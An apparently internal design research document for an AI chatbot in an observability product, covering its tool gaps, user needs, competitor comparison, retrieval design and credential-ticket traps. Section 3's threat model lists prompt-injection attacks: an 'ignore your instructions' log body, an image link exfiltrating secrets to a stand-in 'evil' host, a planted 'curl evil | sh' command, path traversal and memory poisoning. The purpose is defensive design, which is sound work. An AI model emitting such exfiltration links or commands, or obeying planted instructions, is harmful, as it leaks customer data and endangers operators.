# F4 AI chatbot: research

> **Internal research, not a comparison or a claim.** Written 2026-11-02 from public sources read that day. Rivals are named here only to inform design; nothing in this file may be quoted in sales or marketing (Phase 2 foundation, *Founder decisions*).

> **Status:** Proposed, 2026-11-02. Input to F4's specification and design. It approves nothing, and no code is
> written from it.
>
> **How it was checked.** Code was read on branch `feature/anomaly-detection`, with uncommitted work present. Line
> numbers are for that working tree and will drift. **Nothing was run:** no test, no query, no model. Every token,
> latency and memory figure below is arithmetic on a guess, and says so. Outside pages were read on 2026-11-02 through a
> summarizing tool, so check a quote before reusing it publicly. Founder decisions and
> [`phase-2-foundation.md`](../../product/phase-2-foundation.md) are followed; section 7 lists each place this document
> asks the foundation to change, and why.

## The short version

1. **F4 is not starting from nothing.** The read-only MCP server already has nine tools. MCP (Model Context Protocol) is
   the standard way an AI tool calls another product's functions. What is missing is the model loop, the chat screen,
   stored conversations, the knowledge store and all injection testing.
2. **The tools are not good enough for chat yet.** They can only read "the last N hours ending now", so "what happened
   yesterday at 14:00?" cannot be asked precisely. None reads findings, the service map or a single trace.
3. **The chosen ticket design (FD24) is right, and has seven traps the code shows**, including one where every chat on an
   install would share a single rate-limit allowance, and one where the model would see people's names and written reasons.
4. **Chat sends log text to the provider; F3 does not.** So an owner who agreed to F3's "facts and aliases" preview has
   not agreed to what chat sends. Chat needs its own consent step.
5. **Do not stream words as the model writes them.** The output check runs on the finished answer, so streaming would show
   unchecked text. Show live steps instead ("Reading logs for `checkout`, 14:00 to 14:30").
6. **Do not build the expensive parts of retrieval first.** Search one organization's small knowledge set exactly, with
   no vector index, and combine it with keyword search. A customer whose provider has no embeddings still gets keyword search.
7. **The foundation's suggested 2 million tokens a month is far too small for chat.** Worst-case arithmetic gives about 7
   questions. See section 5.

## Words used here

| Term | Meaning |
|---|---|
| **Tool** | A named function the model may ask nexovue to run, such as `search_logs`. Nexovue runs it; the model only asks |
| **Model loop** | Model asks for a tool, nexovue runs it and returns the result, model asks again or answers |
| **Embedding** | A list of numbers representing a text's meaning, so similar texts can be found. Made by a model |
| **pgvector** | The Postgres extension that stores and compares embeddings (decision 0004) |
| **HNSW** | A vector index: fast and approximate, at the cost of memory and some missed results |
| **Exact scan** | Comparing the question with every candidate row: slower on huge sets, never misses |
| **Hybrid search** | Combining meaning-based search with ordinary keyword search |
| **RRF** | Reciprocal Rank Fusion: merges two ranked lists by position, so their scores need not be comparable |
| **Ticket** | The short-lived, read-only credential the model loop uses to call the API on a person's behalf (FD24) |
| **Way out** | Any route by which data could leave: an image address, a link, a message |
| **Poisoning** | Planting text in stored knowledge so it is retrieved and believed later |

Other terms (provider, Rule of Two, abstain, evidence) are defined in the foundation.

## 1. What exists

### The MCP server

| Fact | Where |
|---|---|
| Mounted inside the API at `/api/mcp`, after the routers | `assistant/server.py:34`, `main.py:106` |
| Stateless, so a tool cannot ask a person anything, recorded as a one-way door | `server.py:3-7`, `:86-91` |
| Nine tools: `list_projects`, `list_services`, `get_service`, `search_logs`, `list_error_groups`, `list_incidents`, `list_checks`, `list_deploys`, `list_traces` | `assistant/tools.py:152-304` |
| Each tool calls the same service function as its route, under the token's organization and scope | `tools.py:1-11`, `:86-125` |
| Authorizes only `nvt_live_…` API tokens | `assistant/auth.py:51-54` |
| Caps of 100 rows and 32 KiB. A cut result says so and remains valid JSON | `assistant/bounds.py:15,18,23-50` |
| Tests hold the tool list and that each tool calls only read functions | `tests/test_mcp_tools.py:33,47,82` |
| Rate limited per token: 300 a minute, 8 at once, 32 at once per organization | `ratelimit/policy.py:116-120,268` |
| A console panel explains connecting Claude Code, Cursor and VS Code | `features/apitokens/ConnectAnAssistant.tsx` |

### Gaps in those tools

These were read from the code, not from a failed run.

| Gap | Evidence | Why chat cares |
|---|---|---|
| **No fixed time range.** `window(hours)` always ends now, at most 7 days | `tools.py:78-83`, `:45` | "Yesterday 14:00 to 14:30" cannot be asked. The routes can: `resolve_window(from_time, to_time)` (`services/router.py:59-67`) |
| **No findings tool** | `tools.py`. Routes exist: `findings/router.py:40,63,78` | Findings are the product's centre |
| **No single trace, error group detail or incident detail** | Routes exist and are on the surface: `test_read_surface_structure.py:40-70` | "Show me that trace" stops at a list |
| **No service map, and it is not on the read surface at all** | `servicemap/router.py:17,29` takes `CurrentIdentity` | "What does `checkout` depend on?" A ticket would be refused here, and widening it also widens API tokens |
| **No metrics or detection-state tool** | Routes exist (`test_read_surface_structure.py`) | "Is this within normal?" |
| **Raw attacker text, unmarked** | `tools.py:224-225` dumps each `LogLine`, including `body` and `attributes` (`logs/schemas.py:26-38`). `SERVER_INSTRUCTIONS` (`server.py:36-48`) says nothing of it | Foundation U7. F4 closes this first |
| **A malformed `project_id` raises a plain `ValueError`** | `tools.py:120`. The wrapper turns only `DomainError` into an answer (`:142-145`) | Small defect: the model is told nothing useful. Read, not run |

### Other things chat stands on

- **Masking at intake removes credentials and card numbers only.** The six rule families are credential keys, authorization
  headers, cookies, card numbers, authorization credentials and URL credentials
  (`apps/workers/internal/pipeline/mask/rules.go:25-38`). **Names, email addresses and customer ids in a log body stay,** and chat
  would send them to the provider.
- **Tenant boundary.** The ClickHouse reader is built from a `Reader` at one site, held by a test
  (`auth/dependencies.py:246-257`). Free-form SQL from a model would have to get past this.
- **Browser fence that already exists.** The console's policy is `default-src 'self'` with no separate `img-src`
  (`deploy/caddy/Caddyfile:83`), so a browser should refuse an image from another site. This is a real second layer under
  plain-text rendering, and covers images only: a link a person clicks is not stopped.
- **One raw HTML use:** `features/docs/DocsScreen.tsx:89`. No Markdown library appears in a search of `apps/web/src` and `package.json`.
- **Waking a worker.** Only an interactive click may spend a `NOTIFY`; other work waits for the one-second poll
  (`nexovue_platform/jobs.py:9-11`). A question counts as a click.
- **The job table has no priority column** (`jobs.py`, `ENQUEUE`). Queues and caps are the only way to separate work
  (`scheduler/jobs/worker.py:72`).
- **Only streaming path:** the log tail's WebSocket (`logs/tail.py:1-26`). CSP allows it.
- **pgvector is on the install.** `nexovue.yaml:59-62` includes `compose.infra.yaml`, whose Postgres is
  `pgvector/pgvector:0.8.6-pg18-trixie` with the init folder mounted (`:138,149`). `CREATE EXTENSION` runs only on an empty
  data directory (`deploy/postgres/init/01-extensions.sql:1-3`). No migration uses a vector today. Postgres has a 1 GB
  ceiling (`compose.infra.deploy.yaml:57`; `docs/self-hosting/sizing.md`).
- **Deep links are mostly ready.** Most screens read filters from the address (`app/router.tsx:267-410`). Whether each accepts an
  exact time range was **not checked**; citations depend on it.
- **Shell.** `AppShell` has no panel slot (`app/layout/AppShell.tsx:43-77`), and ⌘K is reserved for search (`TopBar.tsx:82`).
- **Knowledge sources do not exist yet.** There is no notes or runbook table. F22 provides notes and cases. No document owns runbooks.

## 2. What users need

The customers research has no interviews, so these are reasoned from its sources and the code. Five to eight real
conversations remain the founder's open item.

| Person | Wants | What breaks it | So F4 must |
|---|---|---|---|
| **Buyer** (CTO of a small team) | A cost it can predict; assurance that data stays in its tenant; no seat tax | A surprise bill. "Where does my data go?" answered vaguely | Hard limit in tokens, a preview of what is sent, and no per-person price. Say plainly that log text goes to the chosen provider |
| **On-call engineer**, at 3 a.m. | The right number fast, and how to check it | A wrong number that looks right (customers research: a wrong rollup interval, `@duration:>2` against nanoseconds). A spinner with no news. Chat dead during the outage | Show each tool, its filters and its exact range; link to the same view on the real screen; live steps; say what failed. Chat must keep a slot during an incident (trap 7) |
| **New developer** | "What is this service, what normally happens, who fixed this last time?" | Jargon-only answers; no history yet | Notes and resolved cases; "no record of this" as a valid answer; starter questions from the page they are on |
| **Admin** | Control, and a record of use | Not knowing what was sent; a member's use draining the month | Settings beside F3's; per-person daily limit; `ai_runs` with fields, not contents; a clear statement that the switch does not touch MCP (foundation section 4) |
| **Attacker**, with only a public endpoint or browser key | To plant words in logs and service names | See section 3 | Structure, not filters |

**Common questions chat must answer well**, as a starting list for the evaluation bed. It is a guess until real questions exist.

| Question | Tools |
|---|---|
| What is failing right now? | findings, services |
| Why was `checkout` slow yesterday at 14:00? | finding, service with fixed range, deploys, errors, dependencies |
| Did the deploy at 13:50 change anything? | deploys, then F28's `deploy_impact`. Must keep "before, not because" (`errorgroups/schemas.py:15-26`) |
| What does this error mean, and has it happened before? | error group, knowledge |
| Show me failing requests for this customer | logs, traces. Depends on what was sent, so "no matching rows" must not read as "did not happen" |
| How did we fix this last time? | knowledge |
| What should I do? | runbook by reference, F3's explanation. Never a model-invented command (section 3) |

**A question it must answer honestly: "how many?"** Stored traces are sampled, while rollups are written before sampling
(`docs/architecture/current-system-reference.md:40,85`). A model counting rows from `list_traces` would give a wrong number
that looks right, and `bounded` also cuts rows. So counts must come from rollup-backed tools, and tool descriptions must say a
list is not a count.

## 3. Thinking as the attacker

Assume the words get in, as the foundation does. Chat holds untrusted input and private data, so it must have no way out.

| Attack | Result if undefended | Defence | Layer |
|---|---|---|---|
| Log body says "ignore your instructions" | Model obeys | Nothing to obey with: read-only fixed tools. Fence helps a little | Structure |
| Log tells the model to emit `![](https://evil/?d=<secrets>)` | Browser sends the data | Plain React text; CSP refuses the image; validator rejects it | Three separate layers. Documented in the wild against chat products ([Embrace The Red](https://embracethered.com/blog/posts/2023/anthropic-fixes-claude-data-exfiltration-via-images)) |
| Same with a plain link, hoping for a click | Data leaves on click | Validator rejects any URL. Nexovue builds all links | Validator. CSP does not help |
| **Tells the on-call engineer to run a command** (`curl evil \| sh`) | The person is the way out | **Answers contain no model-written commands.** A command appears only quoted by reference from a person-written runbook, labelled as such. LogJack saw models generating dangerous commands of their own after reading injected text | Validator. Not in the foundation; added here |
| Believable false cause: "root cause is the database, restart it" | Wasted hour | Basis label on each claim: `measured`, `from telemetry text`, `from your team's notes` (U6). Text alone is never the stated likely cause | Cannot be stopped, only labelled |
| Steer tools to other projects, then repeat the data | Stays inside the tenant, but crosses projects | Bind the ticket to one project (trap 3) | Structure |
| **Path tricks in a tool argument:** `service_name = "../../audit"` | Reaches another route, as `/services/{service}` is built from model text | Percent-encode every path value; ticket holds a list of allowed routes | Structure, needs a test |
| **Poison the memory.** Plant a name in a finding, wait for it to be indexed | Retrieved later, for everyone, looking like history | Index only what a person wrote plus measured facts. **Never index model words or raw names unfenced.** Retrieved text is free text | Structure |
| **Poison across turns.** An old answer repeating an instruction is replayed in the next model call | Lasting effect in a conversation | History is free text and fenced; old tool results are not replayed | Structure |
| Spend the customer's money: hostile logs push long loops | Budget gone | Reserved tokens per question, 8 steps at most, per-person daily limit | Limits |
| A removed member's question keeps running | Reads after removal | Ticket rechecks the person on every use | Structure |
| Support staff read a conversation | Sees pasted data | Refuse conversation reads in a support view (foundation section 5) | New work |
| A viewer or API token calls the AI | Spends money | `ASK_ASSISTANT`; no token route | Existing pattern |

**What cannot be promised.** LogJack's authors argue read-only agents could not be exploited for privilege escalation or code
execution, but did not test that configuration. OWASP's cheat sheet offers no defence particular to retrieved documents, beyond
treating them as untrusted and enforcing permission outside the model. So the claim is "no write, no way out, labelled claims",
never "injection-proof".

**Injection suite additions for chat**, on top of the foundation's shared one: payloads in `body`, `attributes`, service name, exception
message, deploy metadata, notes and runbooks; a planted item surviving through indexing into a later question; replay across turns;
exit by image, link, Markdown and disguised link; model-written commands; path tricks in each argument; and tool calls for a route not
in the list. Harmless controls must still answer, so that an answer quoting a real `/api/checkout` path is not refused.

## 4. How competitors do it, and at what price

**V** = read on the vendor's own page today. **Prior** = from [`phase-2-competitors-2026-11.md`](../../research/phase-2-competitors-2026-11.md), not re-read.

| Product | What chat does | Where it runs, model | Can it write? | Price | Source |
|---|---|---|---|---|---|
| **Datadog Bits Chat** | Search and analyze telemetry, build dashboards and notebooks, inspect monitors. Available in the web application, the mobile app and Slack (V, re-read 2026-11-02) | Datadog's cloud | Yes | About 0.5 credits a message, stated as an estimate, read from the pricing page; that page and a second one showing $0.10 are **not reconciled**, and the AI Credits page gives no figure. **Our per-message arithmetic is removed: do not reuse a figure** | V, unsettled |
| **Grafana Assistant** | Chat, dashboards, investigations. A search summary said its trace docs describe an expandable query section showing TraceQL. **Unsourced: no page was read, and no URL was kept** | Backend in Grafana Cloud even for self-managed, which needs a paired Cloud stack; prompts and query context go there. No on-premises model is described | Can build dashboards | $20 per active AI user with 40M tokens, then from $2 per 1M, read from [Grafana's pricing page](https://grafana.com/pricing/) only; the usage-limits page gives no figures. Three active users included on Pro, per its [Assistant pricing page](https://grafana.com/docs/grafana-cloud/platform/pricing-and-usage/assistant/), read by a reviewer. Caps by stack, person, team | V |
| **SigNoz Noz** | Conversation over logs, traces, metrics; sidepane or full screen | "Available to SigNoz Cloud users" | Yes: dashboards, alerts, views | Listed under Teams, Prior | V |
| **SigNoz MCP server** | Over 40 tools: logs, traces, metrics, alerts, dashboards, and any agent | "For Self-Hosted SigNoz, you run the MCP server locally". **So self-hosted SigNoz plus any agent is a free route today** | **Not read-only:** creates, updates and deletes alerts and dashboards | Free, plus model cost | V, 2026-11-02 |
| **Sentry Seer Agent** | Launched 2026-04-28. Questions such as "Why is this page slow?" over errors, spans, logs, traces and code context | Sentry's. Started from Slack; **whether it has a web chat is unknown** | Not stated | "For all Sentry users while in beta". **Price after beta unknown.** Whether queries are shown: not stated | V, press release |
| **Coroot** | Stores telemetry, finds cause; AI root cause. **Closest in shape** (competitors research) | Docs name OpenAI and Anthropic. Its blog tests self-hostable models, and says one found the cause. **Bring-your-own-model status not confirmed** | Not checked | Enterprise from $1 per CPU core a month, or Coroot Cloud (F3 research; competitors research) | V for the blog; Prior |
| **Honeycomb Canvas** | Assistant plus notebook of queries and traces. OpenAI and Bedrock. Owner can switch off per team | Honeycomb's cloud. Sends text, schema and "sample telemetry values" | Yes: "create, read, and update" queries and entities | Included, Prior | V |
| **Dynatrace Assist** | Agentic mode queries through tools, "within the scope of your user permissions". Conversations saved. Admins choose tools. PII blocking may refuse a prompt | Its platform, Prior. Managed not addressed on this page | Depends on tools | UI use: no licence charge, queries it runs consume licence, Prior | V |
| **Elastic AI Assistant (deprecated)** | Query generation, Kibana API calls, reads on-screen data, knowledge base of runbooks, issues, Slack; private conversations by default | Self-managed with own LLM connector. Page lists vLLM and LM Studio on newer versions, while the 8.19 page said private LLMs were unsupported. **Deprecated since Stack 9.4 and on Serverless** | Has `execute_connector` | "An appropriate Elastic subscription". Knowledge base needs a **4 GB machine-learning node** | V |
| **Elastic AI Agent** | "Now the default chat experience". Built on Agent Builder | A local model connects through the OpenAI connector, per a reviewer's reading of a search summary | Not checked | **Open.** The page read says "the appropriate subscription or feature tier". A reviewer's summary said Enterprise; this was not confirmed, and whether it applies to the Observability chat is the one question that decides whether "on the free product" separates nexovue from Elastic | V, partly |
| **OpenObserve SRE agent** | An agent service inside the customer's install | Enterprise licence. Own key: yes. Local: the product page says any OpenAI-compatible endpoint, while the setup guide lists only Anthropic, OpenAI and Gemini, **a conflict left open** | Not checked | Free to 50 GB a day | Prior |
| **OpenObserve assistant** | Writes queries, can create dashboards and alerts | Enterprise or cloud. **Bring-your-own-model not confirmed** in this pass | Yes | As above | Prior |
| **HolmesGPT** | Open-source investigator. Apache 2.0, CNCF sandbox. Own keys for OpenAI, Anthropic, Azure, Bedrock, Gemini. Confluence and Slab runbooks | Wherever you run it | **Says "read-only access" by design, and also lists a remediation toolset and opening PRs.** The page does not reconcile these | Free, plus model cost | V |
| **New Relic** | Natural language to NRQL; MCP. A partner connection has the user's access | Cloud | | Advanced Compute | Prior |

Elastic deserves a warning: it is the closest match on "own model, own server, knowledge base", and earlier documents did not cover it. F4's model for private conversations comes from its deprecated assistant, not its replacement.
**Until T8.5 answers the licence question, say nothing about Elastic in public, and do not use "on the free product" as a contrast with it.** All competitor facts here are unusable in public until rechecked in T8.5.

### What the field teaches

1. **Chat over telemetry is now expected.** It sells nothing by itself. Not one product checked treats it as rare.
2. **Most chat assistants can write;** nexovue's cannot. This is a real difference and a real trade-off. Users may want chat to build a dashboard. HolmesGPT's page shows how easily "read-only" drifts, so a claim must be backed by a test.
3. **Limits at several levels are normal:** organization, person, team. Grafana's page is the model. Datadog also has an on/off switch by role.
4. **A price per message or active user is the market's unit.** Nexovue has none because the customer pays the provider directly (FD7). **This is control, not savings.** The customer may pay more: F4's own guess is about 34 million tokens a month for a 5-person team, about US$100 at US$3 per million, against Grafana's listed US$20 for 40 million tokens per active user, and Seer Agent free during beta. Rates and models differ, so this is no like-for-like comparison, but a buyer will make it. The message is: "You pay your own AI provider. nexovue adds no AI charge, and a hard token limit stops spending."
5. **Showing the query is table stakes.** A search summary says Grafana's docs describe it (unsourced, see the table); Dynatrace's and Datadog's pages do not say. Do not claim it as unique. Customers research R6 requires it anyway. The specific difference is the checks outside the model.
6. **Sidepane is the common form.** Noz offers side and full screen.
7. **Elastic's 4 GB node for a knowledge base** shows the danger of a large retrieval stack. On a 16 GB server with a 1 GB Postgres, nexovue must not repeat it.
8. **Slack is where rivals answer.** Bits Chat and Seer Agent work there, and nexovue makes on-call people open the console. U5 stands, and this is its real cost.

## 5. Methods compared

### A. How the model reads data

| Option | For | Against | Verdict |
|---|---|---|---|
| Model writes ClickHouse SQL | Answers anything | Crosses the tenant chokepoint (`test_tenant_chokepoint_structure.py`); a scan can kill a server (`traces/queries.py:8-13`: a 7-day grouping needed 1.8 GiB before tuning); wrong queries look right | **No** |
| Model writes in a small query language compiled by nexovue | Flexible, validated | A language to design, test and document; no second user yet | Later, only if fixed tools prove too narrow. F20's compiled panels may offer a base |
| **Fixed tools over GET routes** | Bounded, tested, permission-held, and simple to display | Questions outside the tools get "cannot answer that" | **Yes** |

### B. How the loop treats free text

| Option | For | Against | Verdict |
|---|---|---|---|
| **One model loop; free text fenced; plain output; validated** | Simple; one model call a step | An injected log can steer later reading and the wording, though there is nothing to write with and no way out | **First version** |
| Dual LLM: a planner that never sees raw text, and a tool-less reader that returns checked fields | Stops steering at the root (Design Patterns paper) | Two calls for each log read, and more cost and delay; a schema can lose the point of a log | **Next step.** Build the tool layer so a log-reading tool can be swapped for a reader. Move if the injection suite shows steering or false causes beyond what labels contain. The trigger is fixed before any run (spec D83) |
| Input filter | Cheap | LogJack: Azure 1/32, GCP 0/32 on log format. Same payloads caught in isolation | **Never as the defence** |

### C. How the answer gets to the browser

| Option | For | Against | Verdict |
|---|---|---|---|
| Stream words as written | Feels fast | **Shows text before the validator has seen it** (U3, U4). OWASP names streaming rendering as a risk. `AIProvider.complete` returns one response | **No** |
| **Show each tool step live, then the checked answer** | Honest, and shows the range before the answer. Useful under pressure | The final wording arrives at once, after a wait. Latency unmeasured | **Yes** |
| Delivery by polling a read route every second or two | No new connection type; works through any proxy; fits a worker in another process | Some extra requests, on the 300-a-minute default tier (`policy.py:101-102`) | **Yes** |
| New WebSocket or server-sent events | Slightly faster | The API must listen for worker writes, for a screen updated by a few steps per question | Not now |

### D. How a number is trusted

| Option | For | Against | Verdict |
|---|---|---|---|
| Links only | Simple | A wrong number with a right link still misleads | Not enough |
| **Show tool, filters and exact range** (R6), links to the same view | Person can check | Person must look | **Required** |
| **Check every number in the answer against the results it cites** | Catches invented numbers with plain code | Rounding and unit changes will cause false alarms. Rate unknown | **Yes, as "this figure could not be matched", with the bed measuring it.** Not a refusal at first |
| The model writes placeholders and nexovue fills values and quotes | Strongest: no copied value can be wrong. Also how a real URL is shown safely | Harder on a weak local model; invalid output costs a retry | **Yes for quotes** (see section 7, item 3). Try for numbers after measuring |

### E. Retrieval

| Option | For | Against | Verdict |
|---|---|---|---|
| Meaning-based only | Finds paraphrases | Misses exact error names and ids, which are most of what operators type. Needs embeddings | No |
| Keyword only (Postgres full-text) | No model, no cost, sends nothing out | Misses "slow" against "latency". Does not meet the plan's "through pgvector" | **Required fallback,** not the end state |
| **Hybrid: both, merged with RRF** | [pgvector's README](https://github.com/pgvector/pgvector) names this approach. Works when either side is empty | Two searches | **Yes** |

**Index.** pgvector searches exactly by default, with perfect recall, and an approximate index is optional. Filters apply after an
approximate scan, so one organization's small share can return too few rows unless iterative scans are on. One tenant's knowledge is
small. **Thousands of chunks is our guess, unmeasured.** So:

- **First version: no HNSW.** A normal index on organization and embedding model, then an exact scan. No memory cost at rest, nothing to tune and no missed results.
- **Add HNSW only when measurement says so.** The hosted service, if it ever opens, is where this would first matter.
- **The column is `vector` with no fixed size,** which the README allows, because each customer's model has its own size (below). The README's route for indexing such a column later is an expression and partial index.

**Embedding sizes and providers.**

| Provider | Embeddings | Note |
|---|---|---|
| Anthropic | **No model of its own** (its docs point to Voyage AI) | So an `anthropic_messages` customer has keyword search unless they add a second connection |
| Amazon Titan Text V2 on Bedrock | 1024, 512 or 256; `amazon.titan-embed-text-v2:0` | AWS's examples invoke it directly. **`bedrock_converse` as designed may not cover it. Check** |
| OpenAI `text-embedding-3-small` | 1536 by default; about $0.02 per million tokens, from third-party price lists, not OpenAI's page | |
| Ollama `nomic-embed-text` | 768; about a 274 MB file, third-party figure; `/api/embed` | Ollama's OpenAI-compatible route needs checking for this |

- **Store the model's name beside each vector.** Comparing vectors from two models is meaningless. Changing model means a background job re-embeds, and until it finishes keyword search carries the load.
- **Embedding also discloses.** Note text and each question go to the provider, so it belongs in the preview.

**What goes in the index.**

| Source | Index? | Why |
|---|---|---|
| Notes written by people on a case (F22) | Yes | The real memory. Still free text: people paste logs |
| Resolved case, composed by nexovue's own code from facts: service, signal, times, closed reason | Yes | Measured facts |
| Runbooks, pasted or uploaded as text in the console | Yes | Customer's own |
| Service descriptions | Yes when they exist | Vision's list; no such field today |
| `findings.title` | **Not raw** | Composed from attacker-reachable names (U1) |
| F3's and chat's own words | **No** | A model's stored words gain no trust. Indexing them would make a loop in which one false cause teaches the next |
| Raw logs and spans | **No** | Recorded split (`vision.md:245`) |

**Chunking.** One note is one chunk; a runbook splits on headings with a size cap. **A guess until the chat suite measures it.**
Deleting a source must delete its chunks in the same transaction (`organizations/tables.py`; `test_deletion_live.py`).

**Runbooks are a new source of work.** No document owned them. A first version needs a small screen under Settings for pasting, listing and
deleting. Pulling from Git, Confluence or GitHub Wiki comes later, through F22's connection. A runbook's age must be shown, since an
old one is a hazard.

### F. Where it appears on screen

| Option | For | Against | Verdict |
|---|---|---|---|
| **Side panel from a TopBar button, on every screen, carrying the current project, window and finding as context** | Catalog's "every screen" (`feature-catalog.md:256`); keeps the evidence in view; matches Noz | Needs a slot in `AppShell`, must work narrow, and must push rather than cover when wide (the founder's "screens use the window" preference) | **Yes** |
| "Ask about this finding" on the finding page | The moment of need | None; opens the same panel | **Yes** |
| ⌘K | Fast | Reserved for search, by a comment in the code | **Leave it reserved.** Give the panel its own key in design |

## 6. The ticket design (FD24): seven traps in the code

FD24 stands. These are what F4's design must solve, all from reading the code.

1. **Rate limiting would count all chats as one address.** A ticket is neither an API token nor a session: `tier_for` falls to the path, `_signed_in` finds no session (`middleware/ratelimit.py:152-154,216-229`), and `_per_address` counts the worker's internal address. Every person, and on a hosted service every tenant, would share one allowance. **The limiter needs a third branch that counts the ticket against the person it stands for.**
2. **`for_member=not reader.is_token` would treat the ticket as a person.** `is_token` is true only with a `token_id` (`auth/dependencies.py:179-181`), and `findings/router.py:90` would then return `FindingForMember`: a person's name, and their written reason (`findings/schemas.py:148-157`). The schema says these "name a person and quote what they wrote". **A ticket must read as a token here,** and the reason stays out of the model's input unless fenced. This is the only `is_token` consumer found.
3. **A person's reach is every project.** `project_scope` is None for a person (`dependencies.py:174`). **Bind each ticket to the question's project** by setting `project_scope`, reusing `may_read_project` (`:183-185`) and giving a byte-identical 404 elsewhere (`projects/service.py:282-293`). It costs "compare prod with staging". It limits what a steered model can reach. This is narrower than the person, which the plan permits.
4. **`CurrentReader` is wider than chat's list.** The surface includes `GET /llm/calls`, the customer's own prompts and completions (`test_read_surface_structure.py:67`). **A ticket must carry an allow-list of routes, checked in the API,** with a test holding it to the chat's tool catalog.
5. **How the worker gets the ticket.** Job arguments must hold ids only, and they are readable in Postgres (foundation section 1). If `nexovue_insight` could mint tickets, a broken AI process could read any tenant. **Recommended: the API mints on `POST`, keeps a fingerprint (`support/tickets.py:48-63` is the pattern), and stores the value sealed under `AI_SECRET_KEY` in `assistant_tickets`, for the worker to open by message id.** Unlike view-as, it is used several times and expires with the question: **5 minutes is a guess.** Every use rechecks that the person is live (`removed_at`, `sessions_valid_from`, `dependencies.py:96-104`), and that their role still allows `ASK_ASSISTANT`. An AI-process compromise can reach only questions in flight.
6. **Ticket and support view.** `_hold_support_view` runs only on session requests (`dependencies.py:105-106`). A support view cannot `POST` a question, since method check refuses it (`:145-146`), so no ticket is minted from one. Tests must prove this, and that `GET` on conversations is refused there (new). A ticket presented on a `CurrentIdentity` route already yields 401 (`deps.py:182-188`), good by default; a new branch in `get_current_reader` (`dependencies.py:224-236`) must not change that, and a distinct prefix must make it refuse in a clear sentence.
7. **An incident is when chat and F3 compete.** Both would use queue `insight`, capped at 4 as a starting guess, and the job table has no priority. An outage opens findings and starts explanations just as people ask questions. **Chat needs its own queue or reserved slots** in `QUEUE_CAPS`. Its soft and hard limits must also be its own: 8 model calls will not fit a 120-second limit on a slow local model. An `expires_at` should end a question nobody is waiting for.

Three further details:

- **The worker cannot use the guarded client to reach the API.** `probes/http_check.perform` refuses private addresses unless `private_allowed` is set (`http_check.py:99`), and that flag must not be opened for model-driven calls. The internal client takes a fixed base URL from settings, never from model text, and is not `AI_PRIVATE_ENDPOINTS`. All values are percent-encoded.
- **`bounded` lives in the API** (`assistant/bounds.py`), and the scheduler cannot import it. It is pure code, and moves to `nexovue_platform` so that both surfaces cut alike.
- **Service map.** Adding it to the surface must be a loud change to `THE_SURFACE` and `docs/product/setup/api.md`, since API tokens gain it too. Recommended: yes.

## 7. Where this differs from the foundation

As the foundation asks, each is stated openly. Each needs its owner to accept it.

| # | Foundation says | Finding | Proposed |
|---|---|---|---|
| 1 | F4 separates tool bodies from MCP's `Context`, with `Call` as seam (section 9) | FD24 calls the routes instead, so the chat never touches those bodies. The sentence predates FD24 | **Drop the separation.** Share a catalog of tool name, description, argument schema and route in `nexovue_platform`; a test holds it to `THE_SURFACE`. MCP keeps calling services in process |
| 2 | Names are replaced by aliases (section 3) | Log bodies, which F4 must read (U2), contain the same names, so aliasing would be partial and misleading. The person types real names, too | **F4 fences names as free text instead of aliasing.** F3 keeps aliases |
| 3 | Text containing a URL or email is rejected (U4) | Rejection is right for model-written text. But "which URL failed?" is a core question, and log lines hold emails | **Keep the rule. Model quotes by reference (`result 3, row 2, field body`), and nexovue shows the stored value as inert text.** It cannot carry anything the logs did not hold, and is not clickable |
| 4 | Suggested monthly limit is 2 million tokens (section 4) | See below | **Chat raises the suggestion, or cuts per-tool results, or both.** Measure first |
| 5 | Telemetry disclosure is one consent, with source separate (section 4) | F3 sends facts and aliases; F4 sends log bodies with whatever masking leaves | **Chat gets its own consent, and its own preview using a real recent log search result.** Owner only, like `CONSENT_AI_DISCLOSURE` |
| 6 | Caps of 100 rows and 32 KiB stay (U2) | Fine for MCP, and costly per step for chat | **Keep them as ceilings. Chat tools use lower ones,** such as 8 KiB, a guess |
| 7 | Actions list (section 5) | Runbooks need a writer | **Add `MANAGE_KNOWLEDGE`:** owner, admin, member, as with notes |

**The token arithmetic. All of it rests on guesses, none on measurement.** Taking about 4 characters a token, a full 32 KiB result is about 8,000 tokens.
A loop resends earlier results each step. Eight full results then cost about 8,000 × (1 + 2 + … + 8) = **288,000 input tokens for one worst-case question,**
so 2 million tokens is about **7 such questions.** A gentler guess of 3 steps at about 2,000 tokens each, plus 1,000 for instructions, is
(3,000 + 5,000 + 7,000) = about 15,000 tokens, or about **130 questions a month** across a whole team. For scale, Grafana includes 40 million
tokens per active user. **So a per-question cap is needed, older results should be dropped or shortened from later steps, and the suggested monthly figure must come from the bed's cost run.**

## 8. What we should bring, and what we should not attempt

### Bring

1. **A chat with no tool that can write, held by tests a customer can read.** Say what it does, not what rivals lack. SigNoz's own MCP server writes, so this is a true difference in what it does, not a safety claim.
2. **Runs on the customer's own model or account, on the customer's server, on the free product.** Grafana's backend is Cloud, Noz is Cloud, OpenObserve's is Enterprise. HolmesGPT and Elastic are closer on this, so "only" must never be said.
3. **A sentence with no valid citation to a step that ran is removed; nexovue sets each label from what the cited rows hold; each step links to the same data on the real screen.** Display of queries is table stakes, so no comparison with rivals.
4. **What MCP cannot give.** After F4's own Step 1, Claude Code reads findings, single traces and fixed ranges through MCP, with no pasting, and self-hosted SigNoz offers that route too. So "no pasting of context" no longer answers "why not just use Claude?". What remains: nexovue checks each sentence and sets its label outside the model; notes and runbooks are searchable in the panel only (D46); and an owner sets one consent and one budget for the team, with no per-developer setup. **A developer happy with Claude Code may need only Step 1.** See the spec, *Chat versus your own AI over MCP*.
5. **"Not enough evidence" and "the data does not cover that"** as proper answers.
6. **Bills in the customer's own provider account,** with a hard token limit and no AI charge from nexovue. Not "cheaper" (section 4, item 4).
7. **A safer MCP server,** with labels, findings and fixed time ranges, even for those who never use chat.

### Do not attempt

| Not this | Why |
|---|---|
| Any write from chat: dashboards, alerts, muting, acknowledging | Breaks the Rule of Two. Revisit only with a person's click on a nexovue-built action, in a later feature |
| Free-form SQL from the model | Section 5A |
| Raw telemetry in the vector store | Recorded split, and cost |
| Shared or team conversations | Private by default, as Elastic. Sharing later would multiply the audience of poisoned text |
| Slack or Teams chat | Model words never leave the console (U5) |
| Markdown, charts or tables written by the model | U4. Nexovue may draw a table or chart from a tool's result, which is data rather than words |
| Crawling a customer's wiki or Git in the first version | Connection and consent work; poisoning surface |
| Cross-project answers | Trap 3. Later, only if asked for |
| A bundled embedding model | Founder's decision for local models, and memory |
| A claim about accuracy | Nothing is measured |

### Must not be claimed

